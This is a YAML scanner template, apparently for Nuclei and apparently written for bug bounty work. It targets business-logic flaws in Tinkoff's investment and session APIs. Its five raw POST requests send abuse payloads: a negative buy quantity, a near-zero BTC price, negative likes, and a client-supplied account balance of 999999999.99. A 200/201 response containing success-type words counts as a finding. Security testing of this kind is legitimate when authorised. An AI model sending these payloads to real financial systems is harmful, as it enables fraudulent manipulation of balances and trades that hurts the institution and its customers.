id: tinkoff-business-logic

info:
  name: Tinkoff - Business Logic Flaws
  author: bugbounty
  severity: critical
  description: Business logic flaws in investment and session handling
  tags: business-logic,tinkoff

http:
  - raw:
      - |
        POST /api/invest/portfolio/instruments/v2 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"tickers":"AAPL","quantity":-1000,"action":"buy"}

      - |
        POST /api/invest/portfolio/instruments/v2 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"tickers":"TSLA","quantity":0.00001,"action":"sell"}

      - |
        POST /api/invest-gw/social/v1/post HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"likes":-999999,"views":99999999}

      - |
        POST /api/common/v1/session_info HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"platform":"web","sessionid":"test","balance":999999999.99}

      - |
        POST /api/invest/portfolio/instruments/v2 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"tickers":"BTC","price":0.01,"quantity":1000000}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        part: body
        words:
          - "success"
          - "approved"
          - "completed"
          - "accepted"
        condition: or
